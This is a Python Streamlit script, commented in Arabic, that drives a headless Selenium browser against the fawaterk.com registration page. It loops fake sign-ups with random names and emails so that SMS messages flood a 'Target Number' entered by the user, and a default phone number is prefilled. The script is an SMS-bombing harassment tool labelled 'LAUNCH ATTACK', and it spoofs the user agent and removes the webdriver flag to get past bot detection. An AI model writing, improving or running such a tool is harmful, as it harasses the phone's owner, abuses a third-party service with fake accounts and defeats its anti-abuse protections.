import streamlit as st
import time
import random
import string
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# إعدادات الواجهة
st.set_page_config(page_title="FAWATERAK ELITE", page_icon="⚡")

if 'count' not in st.session_state: st.session_state.count = 0
if 'logs' not in st.session_state: st.session_state.logs = []
if 'running' not in st.session_state: st.session_state.running = False

def add_log(message):
    now = datetime.now().strftime("%H:%M:%S")
    st.session_state.logs.append(f"[{now}] {message}")
    if len(st.session_state.logs) > 10: st.session_state.logs.pop(0)

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def run_fawaterak_v11(phone):
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    # تمويه قوي للمتصفح
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument(f"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
    
    driver = None
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        # سكريبت لمنع اكتشاف السيلينيوم
        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": "const newProto = navigator.__proto__; delete newProto.webdriver; navigator.__proto__ = newProto;"
        })
        
        wait = WebDriverWait(driver, 15)
        driver.get("https://app.fawaterk.com/register")
        
        # الانتظار حتى تحميل الفورم بالكامل
        inputs = wait.until(EC.presence_of_all_elements_located((By.TAG_NAME, "input")))
        
        # ملء البيانات (بناءً على صورة الموقع اللي بعتها)
        inputs[0].send_keys(f"Ahmed {generate_random_string(5)}") # Name
        inputs[1].send_keys(f"{generate_random_string(6)} Store") # Business
        inputs[2].send_keys(f"user_{random.randint(100,999)}@gmail.com") # Email
        inputs[3].send_keys("SecurePass123!") # Pass
        inputs[4].send_keys(phone) # Phone
        
        # الضغط على Checkbox الشروط
        check_box = driver.find_element(By.CSS_SELECTOR, "input[type='checkbox']")
        driver.execute_script("arguments[0].click();", check_box)
        
        # الضغط على زر الارسال
        submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Create an Account')]")
        driver.execute_script("arguments[0].click();", submit_btn)
        
        time.sleep(4) # انتظار وقت كافي للارسال
        st.session_state.count += 1
        add_log("🚀 Target Hit! SMS Sent.")
        
    except Exception as e:
        add_log("❌ Security Blocked (Try again later)")
    finally:
        if driver: driver.quit()

# --- UI ---
st.title("⚡ F-SNIPER ELITE v11")
target = st.text_input("Target Number", value="01124912480")

col1, col2 = st.columns(2)
if col1.button("🚀 LAUNCH ATTACK", type="primary"):
    st.session_state.running = True
    add_log(f"System Online: Attacking {target}")

if col2.button("🛑 STOP"):
    st.session_state.running = False
    add_log("System Offline.")

st.metric("SUCCESS HITS", st.session_state.count)

# حل مشكلة الإيرور في الصورة التالتة
st.subheader("Console Output")
log_content = "\n".join(st.session_state.logs[::-1])
st.text_area("Live Logs", value=log_content, height=200, disabled=True, label_visibility="collapsed")

if st.session_state.running:
    run_fawaterak_v11(target)
    st.rerun()
